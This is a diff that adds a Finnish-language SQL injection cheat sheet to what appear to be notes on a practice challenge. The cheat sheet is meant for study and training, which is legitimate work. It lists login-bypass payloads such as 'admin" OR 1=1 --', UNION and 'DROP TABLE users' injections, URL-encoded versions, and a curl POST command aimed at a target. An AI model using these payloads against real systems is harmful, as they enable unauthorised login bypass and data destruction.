@@ -77,11 +77,87 @@ Mikä tässä voisi paljastaa, että salasana on "s3cr3t"?
 - Salasanan muunnos: Haasteessa saattaa olla selkeä logiikka, jossa käyttäjän salasanan pitää olla tavallista muunneltu (kuten "secret" -> "s3cr3t"). Tällaista käytetään usein ohjelmoinnissa, koska se on helppo tapa hämärtää oikea salasana, mutta se on silti tunnistettavissa.
 
 
+---
 
+# SQL Injection Lunttilappu – Perusteet & Harjoittelu - START HERE;
 
+## 🔑 Erikoismerkit ja niiden tarkoitus
 
+| Merkki  | Käyttötarkoitus                          | SQL-vaikutus                        |
+|---------|-------------------------------------------|-------------------------------------|
+| `'`     | Sulkee yksittäisen lainauksen            | Rikkoo `'value'` → `'value' OR ...` |
+| `"`     | Sulkee tuplalainauksen                   | Rikkoo `"value"` → `"value" OR ...` |
+| `--`    | SQL-kommenttimerkki                      | Kommentoi loppu rivistä pois        |
+| `OR 1=1`| Aina tosi ehto                            | Ohittaa salasanatarkistuksen        |
 
+---
 
+## 🌐 URL-enkoodaus (tarvitaan GET-parametreissa)
+
+| Merkki   | Enkoodattu muoto |
+|----------|------------------|
+| `'`      | `%27`            |
+| `"`      | `%22`            |
+| ` `      | `%20`            |
+| `=`      | `%3D`            |
+| `--`     | `%2D%2D` tai `--`|
+
+---
+
+## 🧪 Käytännön esimerkkitestit
+
+| Testitapa     | Syöte                                         | Selitys                                |
+|---------------|-----------------------------------------------|----------------------------------------|
+| Lomake        | `admin" OR 1=1 --`                            | Username-kenttään syötetty injektio    |
+| Lomake        | `x`                                           | Password-kenttä voi olla mitä vain     |
+| URL (enkoodattu) | `username=admin%22%20OR%201%3D1%20--&password=x` | Sama injektio URL-parametrina          |
+| Curl POST     | `curl -u user:pass -d "username=admin\" OR 1=1 --&password=x" http://target` | Lähettää injektion POSTina             |
+
+---
+
+## ✅ Vinkit harjoitteluun
+
+- Aloita yksinkertaisilla injektioilla: `' OR 1=1 --`
+- Kokeile molempia: `'` ja `"` eri syötekentissä
+- Tarkkaile virheilmoituksia (esim. `bool given`, SQL error)
+- Kommentti `--` on tärkeä katkaisemaan loppulause
+
+---
+
+## 📌 Esimerkkilause SQL:ssä
+
+```
+SELECT * FROM users WHERE username="admin" OR 1=1 --" AND password="salasana"
+```
+
+# SQL Injection – Vaihtoehtoiset esimerkit käyttäjänimellä `admin` - START HERE
+
+| Syöte                            | Tarkoitus / Kommentti                                             |
+|----------------------------------|-------------------------------------------------------------------|
+| `admin" OR 1=1 --`               | Klassikko – sulkee " ja ohittaa salasanan                        |
+| `admin' OR 1=1 --`               | Sama idea mutta yksittäisellä `'`-merkillä                       |
+| `admin" OR '1'='1' --`           | Sama kuin yllä, mutta kirjaimellisesti tosi ehto                |
+| `admin" OR 1=1#`                 | Joissain tietokannoissa `#` toimii kommenttina (`--` sijaan)     |
+| `admin') OR ('1'='1`             | Käytetään joskus, kun sisäkkäisiä sulkuja on kyselyssä           |
+| `admin" OR 1=1 LIMIT 1 --`       | Rajoittaa tuloksia (joissain tapauksissa hyödyllinen)            |
+| `admin" UNION SELECT 1,2 --`     | UNION hyökkäys (jos haetaan useita kenttiä)                      |
+| `admin"; DROP TABLE users --`    | Tuhovaikutus (jos SQL on huonosti suojattu)                      |
+
+---
+
+## Huomioita
+
+- `admin` voi olla mikä tahansa tunnettu käyttäjänimi – ideana on sulkea alkuperäinen `"admin"` ja lisätä oma ehto perään.
+- `--` kommentoi loppuosan, jolloin esim. `AND password="..."` ei enää vaikuta.
+- Välilyönnit täytyy **enkoodata URL:issa** (`%20`) ja erikoismerkit kuten `"`, `'`, `=` vastaavasti.
+
+---
+
+## Esimerkki URL:ina (enkoodattuna)
+
+HTML: `/index.php?username=admin%22%20OR%201%3D1%20--&password=x` 
+
+ja vastaa tähän SQL muodossa: `SELECT * FROM users WHERE username="admin" OR 1=1 --" AND password="x"`
 
 
 
